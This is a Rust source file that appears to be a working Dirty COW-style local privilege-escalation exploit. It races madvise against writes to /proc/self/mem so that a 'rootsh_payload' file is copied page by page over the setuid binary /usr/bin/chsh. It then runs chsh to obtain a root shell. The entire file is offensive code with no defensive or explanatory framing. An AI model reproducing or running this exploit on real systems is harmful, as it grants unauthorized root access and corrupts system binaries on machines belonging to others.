use std::fs::{self, OpenOptions};
use std::io::{Read, Seek, SeekFrom, Write};
use std::os::unix::io::AsRawFd;
use std::process::Command;
use std::ptr;
use std::sync::{atomic::{AtomicBool, Ordering}, Arc};
use std::thread;
use std::time::{Duration, Instant};

const PAGE_SIZE: usize = 4096;

fn main() -> std::io::Result<()> {
    let target_path = "/usr/bin/chsh";
    let payload_path = "./rootsh_payload";

    let payload = fs::read(payload_path)?;
    let total_len = payload.len();
    println!("[*] Payload: {} bytes. Mode: Ultra-Gentle Chunked.", total_len);

    for offset in (0..total_len).step_by(PAGE_SIZE) {
        let end = std::cmp::min(offset + PAGE_SIZE, total_len);
        let chunk = &payload[offset..end];
        let chunk_len = chunk.len();

        let file = OpenOptions::new().read(true).open(target_path)?;
        let map = unsafe {
            libc::mmap(ptr::null_mut(), chunk_len, libc::PROT_READ, libc::MAP_PRIVATE, file.as_raw_fd(), offset as libc::off_t)
        };
        if map == libc::MAP_FAILED { return Err(std::io::Error::last_os_error()); }

        let running = Arc::new(AtomicBool::new(true));
        let map_usize = map as usize;

        // --- Thread A: Very Slow Madvise ---
        let r_mad = running.clone();
        let mad_thread = thread::spawn(move || {
            let map_ptr = map_usize as *mut libc::c_void;
            while r_mad.load(Ordering::SeqCst) {
                unsafe { libc::madvise(map_ptr, chunk_len, libc::MADV_DONTNEED); }
                // Sleep every single iteration to give the CPU to the writer/kernel
                thread::sleep(Duration::from_micros(500));
            }
        });

        // --- Thread B: Very Slow Writer ---
        let r_write = running.clone();
        let writer_chunk = chunk.to_vec();
        let write_thread = thread::spawn(move || {
            let mut mem_file = OpenOptions::new().write(true).open("/proc/self/mem").unwrap();
            while r_write.load(Ordering::SeqCst) {
                let _ = mem_file.seek(SeekFrom::Start(map_usize as u64));
                let _ = mem_file.write_all(writer_chunk.as_slice());
                // Significantly slowed down to avoid recursive faults
                thread::sleep(Duration::from_millis(1));
            }
        });

        // --- Monitor Loop ---
        let start = Instant::now();
        let mut landed = false;
        loop {
            if let Ok(mut check_file) = OpenOptions::new().read(true).open(target_path) {
                let mut check_buf = vec![0u8; chunk_len];
                let _ = check_file.seek(SeekFrom::Start(offset as u64));
                if check_file.read_exact(&mut check_buf).is_ok() && check_buf == chunk {
                    running.store(false, Ordering::SeqCst);
                    landed = true;
                    println!("[+] SUCCESS: Chunk at {} landed.", offset);
                    break;
                }
            }
            if start.elapsed() > Duration::from_secs(15) {
                running.store(false, Ordering::SeqCst);
                println!("[-] Timeout at chunk {}. The VM is likely too stressed.", offset);
                break;
            }
            thread::sleep(Duration::from_millis(50)); // Slow monitor
        }

        let _ = mad_thread.join();
        let _ = write_thread.join();

        unsafe {
            libc::munmap(map, chunk_len);
            libc::sync(); // Force the kernel to finish its job
        }

        if !landed { return Ok(()); }

        // Let the "Woodchipper" stop spinning before we start the next page
        thread::sleep(Duration::from_secs(1));
    }

    println!("[*] All chunks safely on disk. Syncing...");
    unsafe { libc::sync(); }
    thread::sleep(Duration::from_secs(2));

    println!("[*] Executing: {}", target_path);
    let _ = Command::new(target_path).status();

    Ok(())
}